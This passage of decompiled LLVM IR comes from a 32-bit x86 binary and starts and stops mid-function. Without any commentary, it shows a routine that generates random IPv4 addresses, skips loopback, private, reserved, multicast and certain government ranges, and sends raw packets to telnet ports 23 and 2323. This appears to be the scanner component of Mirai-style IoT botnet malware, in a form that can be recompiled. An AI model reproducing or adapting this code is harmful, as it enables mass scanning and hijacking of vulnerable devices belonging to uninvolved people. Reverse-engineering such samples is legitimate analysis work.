  %v0_804f8c7 = phi i32 [ 0, %dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge ], [ %v3_804f8bb, %dec_label_pc_804f84f ]
  store i32 %v0_804f800, i32* @ebx, align 4
  ret i32 %v0_804f8c7

; uselistorder directives
  uselistorder i32 %v3_804f826, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @function_8051d30, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8c3, { 1, 0 }
  uselistorder label %dec_label_pc_804f83a, { 1, 0 }
}

define i32 @function_80500c7() local_unnamed_addr {
dec_label_pc_80500c7:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %dec_label_pc_80505f7

dec_label_pc_80505f7:                             ; preds = %dec_label_pc_80505e1, %dec_label_pc_80500c7
  %v0_80500c7 = load i32, i32* @global_var_8056990.34, align 16
  store i32 %v0_80500c7, i32* @esi, align 4
  %v0_80500cd = load i32, i32* @esp, align 4
  %v1_80500cd = add i32 %v0_80500cd, 24
  %v2_80500cd = inttoptr i32 %v1_80500cd to i32*
  %v3_80500cd = load i32, i32* %v2_80500cd, align 4
  %v15_80500cd = icmp eq i32 %v3_80500cd, %v0_80500c7
  br i1 %v15_80500cd, label %dec_label_pc_805038b, label %dec_label_pc_80500d7

dec_label_pc_80500d7:                             ; preds = %dec_label_pc_80505f7
  %v1_80500d7 = add i32 %v0_80500cd, 1828
  store i32 %v1_80500d7, i32* @ebp, align 4
  %v1_80500de = add i32 %v0_80500cd, 1868
  %v2_80500de = inttoptr i32 %v1_80500de to i32*
  store i32 0, i32* %v2_80500de, align 4
  %v0_805028e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805028e

dec_label_pc_80500f0:                             ; preds = %dec_label_pc_8050303
  %v11_80500f0 = icmp eq i8 %v2_80502e6, -84
  br i1 %v11_80500f0, label %dec_label_pc_8050350, label %dec_label_pc_80500f9

dec_label_pc_80500f9:                             ; preds = %dec_label_pc_80500f0
  %v10_80500f9 = icmp eq i8 %v2_80502e6, 100
  br i1 %v10_80500f9, label %dec_label_pc_80500f9.dec_label_pc_805031a_crit_edge, label %dec_label_pc_8050102

dec_label_pc_80500f9.dec_label_pc_805031a_crit_edge: ; preds = %dec_label_pc_80500f9
  %.pre = trunc i32 %v2_80502dd to i8
  br label %dec_label_pc_805031a

dec_label_pc_8050102:                             ; preds = %dec_label_pc_8050311, %dec_label_pc_80500f9
  %v11_8050102 = icmp eq i8 %v2_80502e6, -87
  br i1 %v11_8050102, label %dec_label_pc_805036b, label %dec_label_pc_805010b

dec_label_pc_805010b:                             ; preds = %dec_label_pc_8050362, %dec_label_pc_8050102
  %v0_805010b = phi i32 [ %v0_8050362, %dec_label_pc_8050362 ], [ %v5_80502db, %dec_label_pc_8050102 ]
  %v0_805019369 = phi i32 [ %v0_8050359, %dec_label_pc_8050362 ], [ %v2_80502dd, %dec_label_pc_8050102 ]
  %v1_805010b = trunc i32 %v0_805010b to i8
  %v11_805010b = icmp eq i8 %v1_805010b, -58
  br i1 %v11_805010b, label %dec_label_pc_8050331, label %dec_label_pc_8050114

dec_label_pc_8050114:                             ; preds = %dec_label_pc_805036b, %dec_label_pc_8050328, %dec_label_pc_805010b
  %v0_8050114 = phi i32 [ %v0_805011476, %dec_label_pc_805036b ], [ %v5_80502db, %dec_label_pc_8050328 ], [ %v0_805010b, %dec_label_pc_805010b ]
  %v0_805019368 = phi i32 [ %v0_805036b, %dec_label_pc_805036b ], [ %v2_80502dd, %dec_label_pc_8050328 ], [ %v0_805019369, %dec_label_pc_805010b ]
  %v1_8050114 = trunc i32 %v0_8050114 to i8
  %tmp283 = icmp ult i8 %v1_8050114, -32
  br i1 %tmp283, label %dec_label_pc_805011d, label %dec_label_pc_80502d0.preheader

dec_label_pc_805011d:                             ; preds = %dec_label_pc_805031a, %dec_label_pc_8050350.dec_label_pc_805011d_crit_edge, %dec_label_pc_805033a, %dec_label_pc_8050114, %dec_label_pc_8050331
  %v0_8050193 = phi i32 [ %v0_8050359, %dec_label_pc_8050350.dec_label_pc_805011d_crit_edge ], [ %v0_805033a, %dec_label_pc_805033a ], [ %v0_805019368, %dec_label_pc_8050114 ], [ %v0_805033a, %dec_label_pc_8050331 ], [ %v2_80502dd, %dec_label_pc_805031a ]
  %v0_80501a1 = phi i32 [ %v0_805011d.pre, %dec_label_pc_8050350.dec_label_pc_805011d_crit_edge ], [ %v0_805011d65, %dec_label_pc_805033a ], [ %v0_8050114, %dec_label_pc_8050114 ], [ %v0_805011d65, %dec_label_pc_8050331 ], [ %v5_80502db, %dec_label_pc_805031a ]
  %v1_805011d = add i32 %v0_80501a1, -6
  store i32 %v1_805011d, i32* %eax.global-to-local, align 4
  %v1_8050120 = trunc i32 %v1_805011d to i8
  %tmp284 = or i8 %v1_8050120, 1
  %tmp285 = icmp eq i8 %tmp284, 1
  br i1 %tmp285, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_8050128

dec_label_pc_8050128:                             ; preds = %dec_label_pc_805011d
  %v1_8050128 = trunc i32 %v0_80501a1 to i8
  %v10_8050128 = icmp eq i8 %v1_8050128, 11
  br i1 %v10_8050128, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_8050131

dec_label_pc_8050131:                             ; preds = %dec_label_pc_8050128
  %v10_8050131 = icmp eq i8 %v1_8050128, 21
  br i1 %v10_8050131, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_805013a

dec_label_pc_805013a:                             ; preds = %dec_label_pc_8050131
  %v10_805013a = icmp eq i8 %v1_8050128, 22
  br i1 %v10_805013a, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_8050143

dec_label_pc_8050143:                             ; preds = %dec_label_pc_805013a
  %v10_8050143 = icmp eq i8 %v1_8050128, 26
  br i1 %v10_8050143, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_805014c

dec_label_pc_805014c:                             ; preds = %dec_label_pc_8050143
  %v10_805014c = icmp eq i8 %v1_8050128, 28
  br i1 %v10_805014c, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_8050155

dec_label_pc_8050155:                             ; preds = %dec_label_pc_805014c
  %v10_8050155 = icmp eq i8 %v1_8050128, 29
  br i1 %v10_8050155, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_805015e

dec_label_pc_805015e:                             ; preds = %dec_label_pc_8050155
  %v10_805015e = icmp eq i8 %v1_8050128, 30
  br i1 %v10_805015e, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_8050167

dec_label_pc_8050167:                             ; preds = %dec_label_pc_805015e
  %v10_8050167 = icmp eq i8 %v1_8050128, 33
  br i1 %v10_8050167, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_8050170

dec_label_pc_8050170:                             ; preds = %dec_label_pc_8050167
  %v10_8050170 = icmp eq i8 %v1_8050128, 55
  br i1 %v10_8050170, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_8050179

dec_label_pc_8050179:                             ; preds = %dec_label_pc_8050170
  %v11_8050179 = icmp eq i8 %v1_8050128, -42
  br i1 %v11_8050179, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_8050182

dec_label_pc_8050182:                             ; preds = %dec_label_pc_8050179
  %v11_8050182 = icmp eq i8 %v1_8050128, -41
  br i1 %v11_8050182, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_805018b

dec_label_pc_805018b:                             ; preds = %dec_label_pc_8050182
  %v0_805018d = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_805696a.35 to i16*), align 4
  %v1_8050193 = mul i32 %v0_8050193, 65536
  %v2_805019e = and i32 %v1_8050193, 16711680
  %v2_80501a1 = mul i32 %v0_80501a1, 16777216
  %v1_805018d = mul i32 %v0_805018d, 256
  %v2_80501a7 = or i32 %v2_805019e, %v2_80501a1
  %v0_80501a9 = load i32, i32* @edi, align 4
  %v1_80501ab = urem i32 %v0_80501a9, 256
  store i32 %v1_80501ab, i32* %eax.global-to-local, align 4
  %v2_80501b0 = or i32 %v1_80501ab, %v2_80501a7
  store i32 %v2_80501b0, i32* %ecx.global-to-local, align 4
  %v2_80501b2 = or i32 %v1_80501ab, %v1_805018d
  %v1_80501b4 = load i32, i32* @esp, align 4
  %v2_80501b4 = add i32 %v1_80501b4, -4
  %v3_80501b4 = inttoptr i32 %v2_80501b4 to i32*
  store i32 %v2_80501b0, i32* %v3_80501b4, align 4
  %v1_80501b5 = trunc i32 %v2_80501b2 to i16
  %v2_80501b5 = call i16 @llvm.bswap.i16(i16 %v1_80501b5)
  %v3_80501b5 = zext i16 %v2_80501b5 to i32
  %v1_80501b9 = udiv i32 %v2_80501a7, 65536
  %v2_80501b9 = mul nuw i32 %v3_80501b5, 65536
  %v1_80501bc = trunc i32 %v1_80501b9 to i16
  %v2_80501bc = call i16 @llvm.bswap.i16(i16 %v1_80501bc)
  %v3_80501bc = zext i16 %v2_80501bc to i32
  %v6_80501bc = or i32 %v2_80501b9, %v3_80501bc
  store i32 %v6_80501bc, i32* %edx.global-to-local, align 4
  %v0_80501c0 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80501c0 = add i32 %v1_80501b4, -8
  %v3_80501c0 = inttoptr i32 %v2_80501c0 to i32*
  store i32 %v0_80501c0, i32* %v3_80501c0, align 4
  %v0_80501c1 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80501c1, i32* @global_var_8056970.36, align 16
  %v1_80501c7 = add i32 %v1_80501b4, -12
  %v2_80501c7 = inttoptr i32 %v1_80501c7 to i32*
  store i32 20, i32* %v2_80501c7, align 4
  %v1_80501c9 = add i32 %v1_80501b4, -16
  %v2_80501c9 = inttoptr i32 %v1_80501c9 to i32*
  store i32 ptrtoint (i32* @global_var_8056960.37 to i32), i32* %v2_80501c9, align 4
  %v0_80501ce = call i32 @function_804d4b0()
  %v1_80501ce = trunc i32 %v0_80501ce to i16
  store i32 %v0_80501ce, i32* %eax.global-to-local, align 4
  %v0_80501d3 = load i32, i32* @esp, align 4
  %v1_80501d3 = add i32 %v0_80501d3, 1884
  %v2_80501d3 = inttoptr i32 %v1_80501d3 to i32*
  %v3_80501d3 = load i32, i32* %v2_80501d3, align 4
  store i16 %v1_80501ce, i16* bitcast (i32* @global_var_805696a.35 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_80501e9 = ashr i32 %v3_80501d3, 31
  %v2_80501ef = zext i32 %v3_80501d3 to i64
  %v4_80501ef = zext i32 %v2_80501e9 to i64
  %v5_80501ef = mul nuw i64 %v4_80501ef, 4294967296
  %v6_80501ef = or i64 %v5_80501ef, %v2_80501ef
  %v10_80501ef = srem i64 %v6_80501ef, 10
  %v11_80501ef = trunc i64 %v10_80501ef to i32
  store i32 %v11_80501ef, i32* %edx.global-to-local, align 4
  %v1_80501f1 = icmp eq i32 %v11_80501ef, 0
  %v1_80501f3 = icmp eq i1 %v1_80501f1, false
  %. = select i1 %v1_80501f3, i16 5888, i16 4873
  store i16 %., i16* @global_var_8056976.38, align 2
  %v0_8050202 = load i32, i32* @global_var_8056970.36, align 16
  store i32 %v0_8050202, i32* %eax.global-to-local, align 4
  %v1_8050207 = add i32 %v0_80501d3, 12
  %v2_8050207 = inttoptr i32 %v1_8050207 to i32*
  store i32 20, i32* %v2_8050207, align 4
  %v0_8050209 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050209, i32* @global_var_8056978.39, align 8
  %v1_805020e = add i32 %v0_80501d3, 8
  %v2_805020e = inttoptr i32 %v1_805020e to i32*
  store i32 5120, i32* %v2_805020e, align 4
  store i16 0, i16* bitcast (i32* @global_var_8056984.40 to i16*), align 4
  %v1_805021c = add i32 %v0_80501d3, 4
  %v2_805021c = inttoptr i32 %v1_805021c to i32*
  store i32 ptrtoint (i32* @global_var_8056974.41 to i32), i32* %v2_805021c, align 4
  %v2_8050221 = inttoptr i32 %v0_80501d3 to i32*
  store i32 ptrtoint (i32* @global_var_8056960.37 to i32), i32* %v2_8050221, align 4
  %v0_8050226 = call i32 @function_804d500()
  %v1_8050226 = trunc i32 %v0_8050226 to i16
  store i16 %v1_8050226, i16* bitcast (i32* @global_var_8056984.40 to i16*), align 4
  %v0_8050231 = load i32, i32* @global_var_8056970.36, align 16
  store i32 %v0_8050231, i32* %eax.global-to-local, align 4
  %v1_8050236 = load i32, i32* @esp, align 4
  %v2_8050236 = add i32 %v1_8050236, 1848
  %v3_8050236 = inttoptr i32 %v2_8050236 to i32*
  store i32 %v0_8050231, i32* %v3_8050236, align 4
  %v0_805023d = load i16, i16* @global_var_8056976.38, align 2
  %v1_805023d = zext i16 %v0_805023d to i32
  %v2_805023d = load i32, i32* %eax.global-to-local, align 4
  %v3_805023d = and i32 %v2_805023d, -65536
  %v4_805023d = or i32 %v3_805023d, %v1_805023d
  store i32 %v4_805023d, i32* %eax.global-to-local, align 4
  %v0_8050243 = load i32, i32* @esp, align 4
  %v1_8050243 = add i32 %v0_8050243, 1844
  %v2_8050243 = inttoptr i32 %v1_8050243 to i16*
  store i16 2, i16* %v2_8050243, align 2
  %v0_805024d = load i32, i32* %eax.global-to-local, align 4
  %v1_805024d = trunc i32 %v0_805024d to i16
  %v2_805024d = load i32, i32* @esp, align 4
  %v3_805024d = add i32 %v2_805024d, 1846
  %v4_805024d = inttoptr i32 %v3_805024d to i16*
  store i16 %v1_805024d, i16* %v4_805024d, align 2
  %v0_8050255 = load i32, i32* @esp, align 4
  %v1_8050255 = inttoptr i32 %v0_8050255 to i32*
  %v3_8050255 = add i32 %v0_8050255, 4
  %v0_8050256 = load i32, i32* @global_var_80569dc.42, align 4
  store i32 %v0_8050256, i32* %eax.global-to-local, align 4
  %v1_805025b = inttoptr i32 %v3_8050255 to i32*
  %v2_805025b = load i32, i32* %v1_805025b, align 4
  store i32 %v2_805025b, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_805025b, align 4
  %v0_805025e = load i32, i32* @ebp, align 4
  store i32 %v0_805025e, i32* %v1_8050255, align 4
  %v1_805025f = add i32 %v0_8050255, -4
  %v2_805025f = inttoptr i32 %v1_805025f to i32*
  store i32 16384, i32* %v2_805025f, align 4
  %v1_8050264 = add i32 %v0_8050255, -8
  %v2_8050264 = inttoptr i32 %v1_8050264 to i32*
  store i32 40, i32* %v2_8050264, align 4
  %v1_8050266 = add i32 %v0_8050255, -12
  %v2_8050266 = inttoptr i32 %v1_8050266 to i32*
  store i32 ptrtoint (i32* @global_var_8056960.37 to i32), i32* %v2_8050266, align 4
  %v0_805026b = load i32, i32* %eax.global-to-local, align 4
  %v2_805026b = add i32 %v0_8050255, -16
  %v3_805026b = inttoptr i32 %v2_805026b to i32*
  store i32 %v0_805026b, i32* %v3_805026b, align 4
  %v0_805026c = call i32 @function_80529b7()
  store i32 %v0_805026c, i32* %eax.global-to-local, align 4
  %v0_8050271 = load i32, i32* @esp, align 4
  %v1_8050271 = add i32 %v0_8050271, 1900
  %v2_8050271 = inttoptr i32 %v1_8050271 to i32*
  %v3_8050271 = load i32, i32* %v2_8050271, align 4
  %v1_8050278 = add i32 %v3_8050271, 1
  store i32 %v1_8050278, i32* %eax.global-to-local, align 4
  store i32 %v1_8050278, i32* %v2_8050271, align 4
  %v0_8050280 = load i32, i32* @esp, align 4
  %v1_8050280 = add i32 %v0_8050280, 32
  %v0_8050283 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050283 = add i32 %v0_8050283, -383
  %v6_8050283 = sub i32 382, %v0_8050283
  %v7_8050283 = and i32 %v6_8050283, %v0_8050283
  %v8_8050283 = icmp slt i32 %v7_8050283, 0
  %v9_8050283 = icmp eq i32 %v1_8050283, 0
  %v10_8050283 = icmp slt i32 %v1_8050283, 0
  %v3_8050288 = icmp eq i1 %v10_8050283, %v8_8050283
  %v4_8050288 = icmp eq i1 %v9_8050283, false
  %v5_8050288 = and i1 %v4_8050288, %v3_8050288
  br i1 %v5_8050288, label %dec_label_pc_8050387, label %dec_label_pc_805028e

dec_label_pc_805028e:                             ; preds = %dec_label_pc_805018b, %dec_label_pc_80500d7
  %v0_805028e = phi i32 [ %v1_8050280, %dec_label_pc_805018b ], [ %v0_805028e.pre, %dec_label_pc_80500d7 ]
  %v1_805028e = add i32 %v0_805028e, 1828
  %v2_805028e = inttoptr i32 %v1_805028e to i32*
  store i32 0, i32* %v2_805028e, align 4
  %v0_8050299 = load i32, i32* @esp, align 4
  %v1_8050299 = add i32 %v0_8050299, 1832
  %v2_8050299 = inttoptr i32 %v1_8050299 to i32*
  store i32 0, i32* %v2_8050299, align 4
  %v0_80502a4 = load i32, i32* @esp, align 4
  %v1_80502a4 = add i32 %v0_80502a4, 1836
  %v2_80502a4 = inttoptr i32 %v1_80502a4 to i32*
  store i32 0, i32* %v2_80502a4, align 4
  %v0_80502af = load i32, i32* @esp, align 4
  %v1_80502af = add i32 %v0_80502af, 1840
  %v2_80502af = inttoptr i32 %v1_80502af to i32*
  store i32 0, i32* %v2_80502af, align 4
  %v1_80502ba = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  %v2_80502ba = trunc i32 %v1_80502ba to i16
  store i16 %v2_80502ba, i16* bitcast (i32* @global_var_8056964.43 to i16*), align 4
  %v0_80502c5 = load i32, i32* @global_var_80569bc.27, align 4
  store i32 %v0_80502c5, i32* %eax.global-to-local, align 4
  store i32 %v0_80502c5, i32* @global_var_805696c.44, align 4
  br label %dec_label_pc_80502d0.preheader

dec_label_pc_80502d0.preheader:                   ; preds = %dec_label_pc_805028e, %dec_label_pc_805011d, %dec_label_pc_8050128, %dec_label_pc_8050131, %dec_label_pc_805013a, %dec_label_pc_8050143, %dec_label_pc_805014c, %dec_label_pc_8050155, %dec_label_pc_805015e, %dec_label_pc_8050167, %dec_label_pc_8050170, %dec_label_pc_8050179, %dec_label_pc_8050182, %dec_label_pc_805033a, %dec_label_pc_8050359, %dec_label_pc_8050114, %dec_label_pc_805036b
  br label %dec_label_pc_80502d0

dec_label_pc_80502d0:                             ; preds = %dec_label_pc_8050323, %dec_label_pc_805030c, %dec_label_pc_80502fe, %dec_label_pc_80502f9, %dec_label_pc_80502f2, %dec_label_pc_80502ee, %dec_label_pc_80502ea, %dec_label_pc_80502d0, %dec_label_pc_80502d0.preheader
  %v1_80502d0 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80502d0, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v1_80502d0, 65536
  %v1_80502d5 = sdiv i32 %sext, 65536
  %v2_80502db = urem i32 %v1_80502d0, 256
  %v3_80502db = load i32, i32* @ecx, align 4
  %v4_80502db = and i32 %v3_80502db, -256
  %v5_80502db = or i32 %v4_80502db, %v2_80502db
  store i32 %v5_80502db, i32* @ecx, align 4
  %v2_80502dd = udiv i32 %v1_80502d5, 256
  store i32 %v2_80502dd, i32* @ebx, align 4
  %v2_80502e0 = udiv i32 %v1_80502d5, 65536
  store i32 %v2_80502e0, i32* @edx, align 4
  %v2_80502e3 = udiv i32 %v1_80502d5, 16777216
  store i32 %v2_80502e3, i32* @edi, align 4
  %v2_80502e6 = trunc i32 %v1_80502d0 to i8
  %v11_80502e6 = icmp eq i8 %v2_80502e6, 127
  br i1 %v11_80502e6, label %dec_label_pc_80502d0, label %dec_label_pc_80502ea

dec_label_pc_80502ea:                             ; preds = %dec_label_pc_80502d0
  %v6_80502ea = icmp eq i8 %v2_80502e6, 0
  br i1 %v6_80502ea, label %dec_label_pc_80502d0, label %dec_label_pc_80502ee

dec_label_pc_80502ee:                             ; preds = %dec_label_pc_80502ea
  %v11_80502ee = icmp eq i8 %v2_80502e6, 3
  br i1 %v11_80502ee, label %dec_label_pc_80502d0, label %dec_label_pc_80502f2

dec_label_pc_80502f2:                             ; preds = %dec_label_pc_80502ee
  %v2_80502f2 = add nsw i32 %v1_80502d5, -15
  store i32 %v2_80502f2, i32* %eax.global-to-local, align 4
  %v1_80502f5 = trunc i32 %v2_80502f2 to i8
  %tmp286 = or i8 %v1_80502f5, 1
  %tmp287 = icmp eq i8 %tmp286, 1
  br i1 %tmp287, label %dec_label_pc_80502d0, label %dec_label_pc_80502f9

dec_label_pc_80502f9:                             ; preds = %dec_label_pc_80502f2
  %v10_80502f9 = icmp eq i8 %v2_80502e6, 56
  br i1 %v10_80502f9, label %dec_label_pc_80502d0, label %dec_label_pc_80502fe

dec_label_pc_80502fe:                             ; preds = %dec_label_pc_80502f9
  %v10_80502fe = icmp eq i8 %v2_80502e6, 10
  br i1 %v10_80502fe, label %dec_label_pc_80502d0, label %dec_label_pc_8050303

dec_label_pc_8050303:                             ; preds = %dec_label_pc_80502fe
  %v8_8050303 = icmp eq i8 %v2_80502e6, -64
  %v1_8050306 = icmp eq i1 %v8_8050303, false
  br i1 %v1_8050306, label %dec_label_pc_80500f0, label %dec_label_pc_805030c

dec_label_pc_805030c:                             ; preds = %dec_label_pc_8050303
  %v1_805030c = trunc i32 %v2_80502dd to i8
  %v11_805030c = icmp eq i8 %v1_805030c, -88
  br i1 %v11_805030c, label %dec_label_pc_80502d0, label %dec_label_pc_8050311

dec_label_pc_8050311:                             ; preds = %dec_label_pc_805030c
  %v10_8050311 = icmp eq i8 %v2_80502e6, 100
  %v1_8050314 = icmp eq i1 %v10_8050311, false
  br i1 %v1_8050314, label %dec_label_pc_8050102, label %dec_label_pc_805031a

dec_label_pc_805031a:                             ; preds = %dec_label_pc_80500f9.dec_label_pc_805031a_crit_edge, %dec_label_pc_8050311
  %v1_805031a.pre-phi = phi i8 [ %.pre, %dec_label_pc_80500f9.dec_label_pc_805031a_crit_edge ], [ %v1_805030c, %dec_label_pc_8050311 ]
  %tmp288 = icmp ult i8 %v1_805031a.pre-phi, 64
  br i1 %tmp288, label %dec_label_pc_805011d, label %dec_label_pc_8050323

dec_label_pc_8050323:                             ; preds = %dec_label_pc_805031a
  %tmp289 = icmp ult i8 %v1_805031a.pre-phi, 127
  br i1 %tmp289, label %dec_label_pc_80502d0, label %dec_label_pc_8050328

dec_label_pc_8050328:                             ; preds = %dec_label_pc_8050323
  %v11_8050328 = icmp eq i8 %v2_80502e6, -58
  %v1_805032b = icmp eq i1 %v11_8050328, false
  br i1 %v1_805032b, label %dec_label_pc_8050114, label %dec_label_pc_8050331

dec_label_pc_8050331:                             ; preds = %dec_label_pc_8050328, %dec_label_pc_805010b
  %v0_805033a = phi i32 [ %v2_80502dd, %dec_label_pc_8050328 ], [ %v0_805019369, %dec_label_pc_805010b ]
  %v0_805011d65 = phi i32 [ %v5_80502db, %dec_label_pc_8050328 ], [ %v0_805010b, %dec_label_pc_805010b ]
  %v1_8050331 = trunc i32 %v0_805033a to i8
  %tmp290 = icmp ult i8 %v1_8050331, 18
  br i1 %tmp290, label %dec_label_pc_805011d, label %dec_label_pc_805033a

dec_label_pc_805033a:                             ; preds = %dec_label_pc_8050331
  %tmp291 = or i8 %v1_8050331, 1
  %tmp292 = icmp eq i8 %tmp291, 19
  br i1 %tmp292, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_805011d

dec_label_pc_8050344:                             ; preds = %dec_label_pc_80510e5
  store i32 0, i32* %v2_8050347, align 4
  %v1_8050349 = call i32 @function_8053d89(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050349, i32* %eax.global-to-local, align 4
  %v0_8050350.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050350

dec_label_pc_8050350:                             ; preds = %dec_label_pc_80500f0, %dec_label_pc_8050344
  %v0_8050359 = phi i32 [ %v0_8050350.pre, %dec_label_pc_8050344 ], [ %v2_80502dd, %dec_label_pc_80500f0 ]
  %v1_8050350 = trunc i32 %v0_8050359 to i8
  %tmp293 = icmp ult i8 %v1_8050350, 16
  br i1 %tmp293, label %dec_label_pc_8050350.dec_label_pc_805011d_crit_edge, label %dec_label_pc_8050359

dec_label_pc_8050350.dec_label_pc_805011d_crit_edge: ; preds = %dec_label_pc_8050350
  %v0_805011d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805011d

dec_label_pc_8050359:                             ; preds = %dec_label_pc_8050350
  %tmp294 = icmp ult i8 %v1_8050350, 32
  br i1 %tmp294, label %dec_label_pc_80502d0.preheader, label %dec_label_pc_8050362

dec_label_pc_8050362:                             ; preds = %dec_label_pc_8050359
  %v0_8050362 = load i32, i32* @ecx, align 4
  %v1_8050362 = trunc i32 %v0_8050362 to i8
  %v11_8050362 = icmp eq i8 %v1_8050362, -87
  %v1_8050365 = icmp eq i1 %v11_8050362, false
  br i1 %v1_8050365, label %dec_label_pc_805010b, label %dec_label_pc_805036b

dec_label_pc_805036b:                             ; preds = %dec_label_pc_8050362, %dec_label_pc_8050102
  %v0_805011476 = phi i32 [ %v0_8050362, %dec_label_pc_8050362 ], [ %v5_80502db, %dec_label_pc_8050102 ]
  %v0_805036b = phi i32 [ %v0_8050359, %dec_label_pc_8050362 ], [ %v2_80502dd, %dec_label_pc_8050102 ]
  %v1_805036b = trunc i32 %v0_805036b to i8
  %v11_805036b = icmp eq i8 %v1_805036b, -1
  %v1_805036e = icmp eq i1 %v11_805036b, false
  br i1 %v1_805036e, label %dec_label_pc_8050114, label %dec_label_pc_80502d0.preheader

dec_label_pc_8050387:                             ; preds = %dec_label_pc_805018b
  %v0_8050387 = load i32, i32* @esi, align 4
  %v2_8050387 = add i32 %v0_8050280, 56
  %v3_8050387 = inttoptr i32 %v2_8050387 to i32*
  store i32 %v0_8050387, i32* %v3_8050387, align 4
  br label %dec_label_pc_805038b

dec_label_pc_805038b:                             ; preds = %dec_label_pc_80505f7, %dec_label_pc_8050387
  %v1_805038b = call i32 @function_8052779(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805038b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050392 = load i32, i32* @esp, align 4
  %v2_8050392 = add i32 %v1_8050392, 40
  %v3_8050392 = inttoptr i32 %v2_8050392 to i32*
  store i32 %v1_805038b, i32* %v3_8050392, align 4
  br label %dec_label_pc_8050396

dec_label_pc_8050396:                             ; preds = %dec_label_pc_8050433, %dec_label_pc_805042b, %dec_label_pc_8050423, %dec_label_pc_805041b, %dec_label_pc_805040f, %dec_label_pc_8050403, %dec_label_pc_80503fc, %dec_label_pc_80503ea, %dec_label_pc_80503de, %dec_label_pc_80503d9, %dec_label_pc_8050495, %dec_label_pc_805038b
  %v0_8050396 = load i32, i32* @esp, align 4
  %v1_8050396 = add i32 %v0_8050396, 40
  %v2_8050396 = inttoptr i32 %v1_8050396 to i32*
  %v3_8050396 = load i32, i32* %v2_8050396, align 4
  store i32 %v3_8050396, i32* %eax.global-to-local, align 4
  %v1_805039a = inttoptr i32 %v3_8050396 to i32*
  store i32 0, i32* %v1_805039a, align 4
  %v0_80503a0 = load i32, i32* @edi, align 4
  %v1_80503a0 = load i32, i32* @esp, align 4
  %v2_80503a0 = add i32 %v1_80503a0, -4
  %v3_80503a0 = inttoptr i32 %v2_80503a0 to i32*
  store i32 %v0_80503a0, i32* %v3_80503a0, align 4
  %v0_80503a1 = load i32, i32* @edi, align 4
  %v2_80503a1 = add i32 %v1_80503a0, -8
  %v3_80503a1 = inttoptr i32 %v2_80503a1 to i32*
  store i32 %v0_80503a1, i32* %v3_80503a1, align 4
  %v1_80503a2 = add i32 %v1_80503a0, -12
  %v2_80503a2 = inttoptr i32 %v1_80503a2 to i32*
  store i32 0, i32* %v2_80503a2, align 4
  %v1_80503a4 = add i32 %v1_80503a0, -16
  %v2_80503a4 = inttoptr i32 %v1_80503a4 to i32*
  store i32 0, i32* %v2_80503a4, align 4
  %v1_80503a6 = add i32 %v1_80503a0, -20
  %v2_80503a6 = inttoptr i32 %v1_80503a6 to i32*
  store i32 16384, i32* %v2_80503a6, align 4
  %v1_80503ab = add i32 %v1_80503a0, -24
  %v2_80503ab = inttoptr i32 %v1_80503ab to i32*
  store i32 1514, i32* %v2_80503ab, align 4
  %v0_80503b0 = load i32, i32* @global_var_80569dc.42, align 4
  store i32 %v0_80503b0, i32* %esi.global-to-local, align 4
  %v1_80503b6 = add i32 %v1_80503a0, 58
  store i32 %v1_80503b6, i32* %edx.global-to-local, align 4
  %v2_80503ba = add i32 %v1_80503a0, -28
  %v3_80503ba = inttoptr i32 %v2_80503ba to i32*
  store i32 %v1_80503b6, i32* %v3_80503ba, align 4
  %v0_80503bb = load i32, i32* %esi.global-to-local, align 4
  %v2_80503bb = add i32 %v1_80503a0, -32
  %v3_80503bb = inttoptr i32 %v2_80503bb to i32*
  store i32 %v0_80503bb, i32* %v3_80503bb, align 4
  %v0_80503bc = call i32 @function_8052941()
  store i32 %v0_80503bc, i32* %eax.global-to-local, align 4
  %v0_80503c1 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_80503bc, 1
  br i1 %tmp, label %dec_label_pc_80504a6, label %dec_label_pc_80503cc

dec_label_pc_80503cc:                             ; preds = %dec_label_pc_8050396
  %v1_80503cc = add i32 %v0_80503c1, 72
  %v2_80503cc = inttoptr i32 %v1_80503cc to i32*
  %v3_80503cc = load i32, i32* %v2_80503cc, align 4
  store i32 %v3_80503cc, i32* %ecx.global-to-local, align 4
  %v1_80503d0 = inttoptr i32 %v3_80503cc to i32*
  %v2_80503d0 = load i32, i32* %v1_80503d0, align 4
  %v11_80503d0 = icmp eq i32 %v2_80503d0, 11
  br i1 %v11_80503d0, label %dec_label_pc_80504a6, label %dec_label_pc_80503d9

dec_label_pc_80503d9:                             ; preds = %dec_label_pc_80503cc
